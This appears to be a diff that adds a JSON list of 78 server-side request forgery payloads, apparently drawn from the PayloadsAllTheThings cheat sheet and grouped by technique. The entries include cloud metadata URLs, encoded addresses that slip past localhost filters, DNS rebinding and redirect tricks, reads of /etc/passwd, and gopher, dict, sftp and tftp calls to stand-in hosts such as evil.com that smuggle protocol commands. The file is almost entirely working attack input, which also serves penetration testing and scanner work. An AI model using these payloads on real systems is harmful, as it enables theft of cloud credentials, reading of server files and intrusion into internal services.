@@ -1,0 +1,704 @@
+[
+  {
+    "id": "ssrf-1",
+    "title": "Methodology",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "context": "Methodology",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-2",
+    "title": "Default Targets",
+    "payload": "http://localhost:80",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-3",
+    "title": "Default Targets",
+    "payload": "http://localhost:22",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-4",
+    "title": "Default Targets",
+    "payload": "https://localhost:443",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-5",
+    "title": "Default Targets",
+    "payload": "http://127.0.0.1:80",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-6",
+    "title": "Default Targets",
+    "payload": "http://127.0.0.1:22",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-7",
+    "title": "Default Targets",
+    "payload": "https://127.0.0.1:443",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-8",
+    "title": "Default Targets",
+    "payload": "http://0.0.0.0:80",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-9",
+    "title": "Default Targets",
+    "payload": "http://0.0.0.0:22",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-10",
+    "title": "Default Targets",
+    "payload": "https://0.0.0.0:443",
+    "context": "Default Targets",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-11",
+    "title": "Bypass Localhost with IPv6 Notation",
+    "payload": "http://[::]:80/",
+    "context": "Bypass Localhost with IPv6 Notation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-12",
+    "title": "Bypass Localhost with IPv6 Notation",
+    "payload": "http://[0000::1]:80/",
+    "context": "Bypass Localhost with IPv6 Notation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-13",
+    "title": "Bypass Localhost with IPv6 Notation",
+    "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]",
+    "context": "Bypass Localhost with IPv6 Notation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-14",
+    "title": "Bypass Localhost with IPv6 Notation",
+    "payload": "http://[::ffff:127.0.0.1]",
+    "context": "Bypass Localhost with IPv6 Notation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-15",
+    "title": "Bypass Localhost with a Domain Redirect",
+    "payload": "NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1",
+    "context": "Bypass Localhost with a Domain Redirect",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-16",
+    "title": "Bypass Localhost with a Domain Redirect",
+    "payload": "127.0.0.1",
+    "context": "Bypass Localhost with a Domain Redirect",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-17",
+    "title": "Bypass Localhost with CIDR",
+    "payload": "http://127.127.127.127",
+    "context": "Bypass Localhost with CIDR",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-18",
+    "title": "Bypass Localhost with CIDR",
+    "payload": "http://127.0.1.3",
+    "context": "Bypass Localhost with CIDR",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-19",
+    "title": "Bypass Localhost with CIDR",
+    "payload": "http://127.0.0.0",
+    "context": "Bypass Localhost with CIDR",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-20",
+    "title": "Bypass Using Rare Address",
+    "payload": "http://0/",
+    "context": "Bypass Using Rare Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-21",
+    "title": "Bypass Using Rare Address",
+    "payload": "http://127.1",
+    "context": "Bypass Using Rare Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-22",
+    "title": "Bypass Using Rare Address",
+    "payload": "http://127.0.1",
+    "context": "Bypass Using Rare Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-23",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://2130706433/ = http://127.0.0.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-24",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://3232235521/ = http://192.168.0.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-25",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://3232235777/ = http://192.168.1.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-26",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://2852039166/ = http://169.254.169.254",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-27",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://0177.0.0.1/ = http://127.0.0.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-28",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://o177.0.0.1/ = http://127.0.0.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-29",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://0o177.0.0.1/ = http://127.0.0.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-30",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://q177.0.0.1/ = http://127.0.0.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-31",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://0x7f000001 = http://127.0.0.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-32",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://0xc0a80101 = http://192.168.1.1",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-33",
+    "title": "Bypass Using an Encoded IP Address",
+    "payload": "http://0xa9fea9fe = http://169.254.169.254",
+    "context": "Bypass Using an Encoded IP Address",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-34",
+    "title": "Bypass Using Different Encoding",
+    "payload": "http://127.0.0.1/%61dmin",
+    "context": "Bypass Using Different Encoding",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-35",
+    "title": "Bypass Using Different Encoding",
+    "payload": "http://127.0.0.1/%2561dmin",
+    "context": "Bypass Using Different Encoding",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-36",
+    "title": "Bypass Using Different Encoding",
+    "payload": "http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com",
+    "context": "Bypass Using Different Encoding",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-37",
+    "title": "Bypassing via ipv6 hostname",
+    "payload": "http://ip6-localhost = ::1",
+    "context": "Bypassing via ipv6 hostname",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-38",
+    "title": "Bypassing via ipv6 hostname",
+    "payload": "http://ip6-loopback = ::1",
+    "context": "Bypassing via ipv6 hostname",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-39",
+    "title": "Bypassing Using a Redirect",
+    "payload": "https://307.r3dir.me/--to/?url=http://localhost",
+    "context": "Bypassing Using a Redirect",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-40",
+    "title": "Bypassing Using a Redirect",
+    "payload": "https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me",
+    "context": "Bypassing Using a Redirect",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-41",
+    "title": "Bypass Using DNS Rebinding",
+    "payload": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "context": "Bypass Using DNS Rebinding",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-42",
+    "title": "Bypass Using DNS Rebinding",
+    "payload": "$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "context": "Bypass Using DNS Rebinding",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-43",
+    "title": "Bypass Using DNS Rebinding",
+    "payload": "Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "context": "Bypass Using DNS Rebinding",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-44",
+    "title": "Bypass Using DNS Rebinding",
+    "payload": "Address: 1.2.3.4",
+    "context": "Bypass Using DNS Rebinding",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-45",
+    "title": "Bypass Using DNS Rebinding",
+    "payload": "Address: 169.254.169.254",
+    "context": "Bypass Using DNS Rebinding",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-46",
+    "title": "Bypass Abusing URL Parsing Discrepancy",
+    "payload": "http://127.1.1.1:80\\@127.2.2.2:80/",
+    "context": "Bypass Abusing URL Parsing Discrepancy",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-47",
+    "title": "Bypass Abusing URL Parsing Discrepancy",
+    "payload": "http://127.1.1.1:80\\@@127.2.2.2:80/",
+    "context": "Bypass Abusing URL Parsing Discrepancy",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-48",
+    "title": "Bypass Abusing URL Parsing Discrepancy",
+    "payload": "http://127.1.1.1:80:\\@@127.2.2.2:80/",
+    "context": "Bypass Abusing URL Parsing Discrepancy",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-49",
+    "title": "Bypass Abusing URL Parsing Discrepancy",
+    "payload": "http://127.1.1.1:80#\\@127.2.2.2:80/",
+    "context": "Bypass Abusing URL Parsing Discrepancy",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-50",
+    "title": "Bypass Abusing URL Parsing Discrepancy",
+    "payload": "http:127.0.0.1/",
+    "context": "Bypass Abusing URL Parsing Discrepancy",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-51",
+    "title": "Bypass Abusing URL Parsing Discrepancy",
+    "payload": "urllib2",
+    "context": "Bypass Abusing URL Parsing Discrepancy",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-52",
+    "title": "Bypass Abusing URL Parsing Discrepancy",
+    "payload": "requests",
+    "context": "Bypass Abusing URL Parsing Discrepancy",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-53",
+    "title": "Bypass Abusing URL Parsing Discrepancy",
+    "payload": "urllib",
+    "context": "Bypass Abusing URL Parsing Discrepancy",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-54",
+    "title": "Bypass PHP filter_var() Function",
+    "payload": "http://test???test.com",
+    "context": "Bypass PHP filter_var() Function",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-55",
+    "title": "Bypass PHP filter_var() Function",
+    "payload": "0://evil.com:80;http://google.com:80/",
+    "context": "Bypass PHP filter_var() Function",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-56",
+    "title": "Bypass Using TLD localhost",
+    "payload": "$ ping PayloadsAllTheThings.localhost -c 1",
+    "context": "Bypass Using TLD localhost",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-57",
+    "title": "Bypass Using TLD localhost",
+    "payload": "PING PayloadsAllTheThings.localhost (::1) 56 data bytes",
+    "context": "Bypass Using TLD localhost",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-58",
+    "title": "Bypass Using TLD localhost",
+    "payload": "64 bytes from ip6-localhost (::1): icmp_seq=1 ttl=64 time=0.070 ms",
+    "context": "Bypass Using TLD localhost",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-59",
+    "title": "Bypass Using TLD localhost",
+    "payload": "1 packets transmitted, 1 received, 0% packet loss, time 0ms",
+    "context": "Bypass Using TLD localhost",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-60",
+    "title": "Bypass Using TLD localhost",
+    "payload": "rtt min/avg/max/mdev = 0.070/0.070/0.070/0.000 ms",
+    "context": "Bypass Using TLD localhost",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-61",
+    "title": "Bypass Using JAR Scheme",
+    "payload": "jar:scheme://domain/path!/",
+    "context": "Bypass Using JAR Scheme",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-62",
+    "title": "Bypass Using JAR Scheme",
+    "payload": "jar:http://127.0.0.1!/",
+    "context": "Bypass Using JAR Scheme",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-63",
+    "title": "Bypass Using JAR Scheme",
+    "payload": "jar:https://127.0.0.1!/",
+    "context": "Bypass Using JAR Scheme",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-64",
+    "title": "Bypass Using JAR Scheme",
+    "payload": "jar:ftp://127.0.0.1!/",
+    "context": "Bypass Using JAR Scheme",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-65",
+    "title": "File",
+    "payload": "file:///etc/passwd",
+    "context": "File",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-66",
+    "title": "File",
+    "payload": "file://\\/\\/etc/passwd",
+    "context": "File",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-67",
+    "title": "HTTP",
+    "payload": "ssrf.php?url=http://127.0.0.1:22",
+    "context": "HTTP",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-68",
+    "title": "HTTP",
+    "payload": "ssrf.php?url=http://127.0.0.1:80",
+    "context": "HTTP",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-69",
+    "title": "HTTP",
+    "payload": "ssrf.php?url=http://127.0.0.1:443",
+    "context": "HTTP",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-70",
+    "title": "Dict",
+    "payload": "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>",
+    "context": "Dict",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-71",
+    "title": "Dict",
+    "payload": "ssrf.php?url=dict://attacker:11111/",
+    "context": "Dict",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-72",
+    "title": "SFTP",
+    "payload": "ssrf.php?url=sftp://evil.com:11111/",
+    "context": "SFTP",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-73",
+    "title": "TFTP",
+    "payload": "ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET",
+    "context": "TFTP",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-74",
+    "title": "LDAP",
+    "payload": "ssrf.php?url=ldap://localhost:11211/%0astats%0aquit",
+    "context": "LDAP",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-75",
+    "title": "Netdoc",
+    "payload": "ssrf.php?url=netdoc:///etc/passwd",
+    "context": "Netdoc",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-76",
+    "title": "Gopher",
+    "payload": "gopher://[host]:[port]/[type][selector]",
+    "context": "Gopher",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-77",
+    "title": "Gopher",
+    "payload": "gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A",
+    "context": "Gopher",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "id": "ssrf-78",
+    "title": "Upgrade to XSS",
+    "payload": "https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg",
+    "context": "Upgrade to XSS",
+    "tags": [
+      "ssrf"
+    ]
+  }
+]
